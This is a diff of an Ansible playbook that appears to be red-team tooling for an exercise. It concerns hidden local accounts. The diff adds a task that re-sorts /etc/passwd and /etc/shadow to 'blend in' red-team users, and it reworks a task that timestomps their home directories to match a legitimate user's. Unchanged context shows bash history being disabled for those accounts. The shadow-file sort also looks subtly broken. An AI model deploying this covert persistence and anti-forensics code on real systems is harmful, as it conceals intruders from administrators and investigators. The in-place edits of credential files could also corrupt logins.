@@ -35,17 +35,14 @@
     shell: /bin/bash
     create_home: yes
     system: no
-  loop: "{{ redteam_local_all[(redteam_local_all | length // 2):] }}"
+  loop: "{{ redteam_local_all[(redteam_local_all | length // 2):] }}" 
 
-- name: Add redteam users
-  ansible.builtin.user:
-    name: "{{ item }}"
-    password: "{{ redteam_user_password | ansible.builtin.password_hash('sha512') }}" 
-    groups: sudo
-    append: yes
-    shell: /bin/bash
-    create_home: yes
-  loop: "{{ redteam_local_all }}"
+- name: Sort /etc/passwd by UID to blend users in
+  ansible.builtin.shell: |
+    sort -t: -k3 -n /etc/passwd -o /etc/passwd
+    sort -t: -k1 -n /etc/shadow -o /etc/shadow
+  args:
+    executable: /bin/bash
 
 - name: Disable bash history in existing .bashrc for redteam users
   ansible.builtin.blockinfile:
@@ -74,15 +71,16 @@
   
 - name: Timestomp redteam user home directories
   ansible.builtin.shell: |
-    # Get the modification time of /home/greyteam in seconds since epoch
     REF_TIME=$(stat -c %Y /home/greyteam)
-    # Generate a random offset between 1 and 21600 seconds (6 hours)
-    OFFSET=$((1 + $RANDOM % 21600))
-    # Calculate new timestamp
+    OFFSET=$((1 + RANDOM % 21600))
     NEW_TIME=$((REF_TIME - OFFSET))
-    # Convert epoch to format YYYYMMDDhhmm.ss for the 'touch' command
     STAMP=$(date -d @"$NEW_TIME" +"%Y%m%d%H%M.%S")
-    # Apply to the directory
-    touch -t "$STAMP" "/home/{{ item }}"
-    find "/home/{{ item }}" -exec touch -t "$STAMP" {} +
+    
+    if [ -d "/home/{{ item }}" ]; then
+      touch -t "$STAMP" "/home/{{ item }}"
+      find "/home/{{ item }}" -exec touch -t "$STAMP" {} +
+    fi
   loop: "{{ redteam_local_all }}"
+  args:
+    executable: /bin/bash
+  ignore_errors: yes
